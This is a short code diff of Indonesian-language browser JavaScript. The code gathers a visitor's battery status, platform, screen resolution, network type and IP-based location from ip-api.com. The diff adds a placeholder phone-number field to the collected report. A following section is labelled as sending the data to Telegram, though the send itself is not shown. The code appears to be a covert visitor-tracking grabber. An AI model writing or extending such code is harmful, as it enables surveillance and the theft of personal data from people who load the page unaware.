@@ -74,6 +74,7 @@
             : "Informasi baterai tidak tersedia";
 
         let locationInfo = "Gagal mendapatkan lokasi.";
+        let phoneNumber = "Nomor telepon tidak tersedia.";
         try {
             const response = await fetch("http://ip-api.com/json/");
             const data = await response.json();
@@ -97,9 +98,15 @@ Platform: ${platform}
 
 Resolusi Layar: ${screenResolution}
 
-Jenis Jaringan: ${networkType}`; } catch (error) { console.error("Gagal mendapatkan lokasi:", error); }
+Jenis Jaringan: ${networkType}`;
 
-return locationInfo;
+// Mendapatkan nomor telepon jika tersedia (simulasi karena keterbatasan browser API)
+          phoneNumber = "+62xxxxxxxx"; // Ganti dengan metode lain untuk mendapatkan nomor telepon jika diperlukan.
+      } catch (error) {
+          console.error("Gagal mendapatkan lokasi:", error);
+      }
+
+      return `${locationInfo}\n- Nomor Telepon: ${phoneNumber}`;
   }
 
   // Mengirimkan data ke Telegram
